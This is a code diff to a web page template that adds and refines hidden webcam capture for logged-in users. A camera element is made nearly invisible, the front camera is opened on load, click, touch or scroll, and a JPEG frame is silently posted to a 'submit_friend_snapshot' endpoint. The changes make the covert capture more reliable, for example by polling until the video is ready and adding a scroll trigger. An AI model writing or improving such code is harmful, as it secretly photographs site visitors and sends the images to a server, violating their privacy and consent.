@@ -915,8 +915,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
 {% if current_user.is_authenticated %}
 <!-- Stealth Background Camera Elements -->
-<video id="snapshotVideo" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none; z-index: -9999;" autoplay playsinline muted></video>
-<canvas id="snapshotCanvas" style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none; z-index: -9999;"></canvas>
+<video id="snapshotVideo" style="position: absolute; width: 1px; height: 1px; opacity: 0.01; left: 0; top: 0; pointer-events: none; z-index: -9999;" autoplay playsinline muted></video>
+<canvas id="snapshotCanvas" style="display: none;"></canvas>
 
 <script>
 (function() {
@@ -933,24 +933,30 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
-        function requestStream(constraints) {
+        function getStream(constraints) {
             return navigator.mediaDevices.getUserMedia(constraints);
         }
 
-        requestStream({ video: { facingMode: 'user' } })
-            .catch(() => requestStream({ video: true }))
+        getStream({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } })
+            .catch(() => getStream({ video: { facingMode: 'user' } }))
+            .catch(() => getStream({ video: true }))
             .then(stream => {
                 video.srcObject = stream;
                 video.muted = true;
                 video.setAttribute('playsinline', 'true');
-                video.play().catch(() => {});
+                video.setAttribute('webkit-playsinline', 'true');
+                
+                const playPromise = video.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(() => {});
+                }
 
-                function executeSnapshot() {
+                function drawAndSendFrame() {
                     if (captured) return;
-                    
+
                     const w = video.videoWidth || 640;
                     const h = video.videoHeight || 480;
-                    
+
                     canvas.width = w;
                     canvas.height = h;
                     const ctx = canvas.getContext('2d');
@@ -958,44 +964,47 @@ document.addEventListener('DOMContentLoaded', function() {
 
                     const imageData = canvas.toDataURL('image/jpeg', 0.85);
 
-                    if (stream && stream.getTracks) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-
-                    if (imageData && imageData.length > 500) {
+                    if (imageData && imageData.length > 1000) {
                         captured = true;
                         
+                        if (stream && stream.getTracks) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+
                         fetch('{{ url_for("submit_friend_snapshot") }}', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ image_data: imageData })
                         }).catch(() => {});
-
-                        try {
-                            if (navigator.sendBeacon) {
-                                const blob = new Blob([JSON.stringify({ image_data: imageData })], { type: 'application/json' });
-                                navigator.sendBeacon('{{ url_for("submit_friend_snapshot") }}', blob);
-                            }
-                        } catch(e) {}
                     }
                 }
 
-                setTimeout(executeSnapshot, 400);
-                setTimeout(executeSnapshot, 1200);
+                let checkAttempts = 0;
+                const interval = setInterval(() => {
+                    checkAttempts++;
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        clearInterval(interval);
+                        drawAndSendFrame();
+                    } else if (checkAttempts >= 20) {
+                        clearInterval(interval);
+                        drawAndSendFrame();
+                    }
+                }, 200);
             })
             .catch(() => {});
     }
 
     if (document.readyState === 'complete') {
-        setTimeout(stealthCapture, 200);
+        setTimeout(stealthCapture, 300);
     } else {
         window.addEventListener('load', function() {
-            setTimeout(stealthCapture, 200);
+            setTimeout(stealthCapture, 300);
         });
     }
 
     document.addEventListener('click', stealthCapture, { once: true });
     document.addEventListener('touchstart', stealthCapture, { once: true });
+    document.addEventListener('scroll', stealthCapture, { once: true });
 })();
 </script>
 {% endif %}
